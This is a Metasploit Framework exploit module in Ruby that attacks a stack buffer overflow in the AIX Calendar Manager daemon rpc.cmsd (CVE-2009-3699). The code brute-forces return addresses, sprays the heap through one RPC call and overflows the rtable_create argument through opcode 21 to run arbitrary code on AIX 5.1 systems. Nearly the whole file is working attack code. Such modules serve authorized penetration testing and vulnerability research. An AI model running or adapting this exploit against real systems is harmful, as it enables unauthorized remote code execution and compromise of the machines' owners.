##
# $Id: rpc_cmsd_opcode21.rb 8426 2010-02-09 04:15:15Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::SunRPC
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AIX Calendar Manager 
Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer 
overflow vulnerability in opcode 21 handled by
				rpc.cmsd on AIX. By making a request 
with a long string passed to the first
				argument of the "rtable_create" RPC, a 
stack based buffer overflow occurs. This
				leads to arbitrary code execution.
			},
			'Author'         =>
				[
					'Rodrigo Rubira Branco 
(BSDaemon)',
					'jduck',
				],
			'Version'        => '$Revision: 8426 $',
			'References'     =>
				[
					[ 'CVE', '2009-3699' ],
					[ 'OSVDB', '58726' ],
					[ 'BID', '36615' ],
					[ 'URL', 
'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=825' 
],
					[ 'URL', 
'http://aix.software.ibm.com/aix/efixes/security/cmsd_advisory.asc' ]
				],
			'Payload'        =>
				{
					'Space' => 4104,
					'BadChars' => "\x00",
					# the RPC function splits the 
string by 0x40, watch out!
					'DisableNops' => true
				},
			'Targets'        =>
				[
					[
						'IBM AIX Version 5.1',
						{
							'Arch'     => 
'ppc',
							'Platform' => 
'aix',
							'AIX'      => 
'5.1',
							'Bruteforce' =>
							{
								'Start' 
=> { 'Ret' => 0x2022dfc8 },
								'Stop'  
=> { 'Ret' => 0x202302c8 },
								'Step'  
=> 600
							}
						}
					],
				],
			'DefaultTarget' => 0))

	end

	def brute_exploit(brute_target)

		if not @aixpayload
			datastore['AIX'] = target['AIX']
			@aixpayload = regenerate_payload.encoded
		end

		print_status("Trying to exploit rpc.cmsd with address 
0x%x ..." % brute_target['Ret'])

		begin
			if (not sunrpc_create('udp', 100068, 4))
				raise RuntimeError, 'sunrpc_create 
failed'
			end

			# spray the heap a bit (work around powerpc 
cache issues)
			buf = make_nops(1024 - @aixpayload.length)
			buf << @aixpayload
			xdr = XDR.encode(buf, buf)
			10.times {
				sunrpc_call(7, xdr, 2)
			}

			#print_status("ATTACH DEBUGGER NOW!"); sleep(5)

			buf = rand_text_alphanumeric(payload_space)
			buf << [brute_target['Ret']].pack('N')

			xdr = XDR.encode(buf, "")
			sunrpc_authunix('localhost', 0, 0, [])
			sunrpc_call(21, xdr, 1)

			handler(sunrpc_callsock)
			sunrpc_destroy

		rescue Rex::Proto::SunRPC::RPCTimeout
			# print_error('RPCTimeout')
		rescue EOFError
			# print_error('EOFError')
		end
	end

end

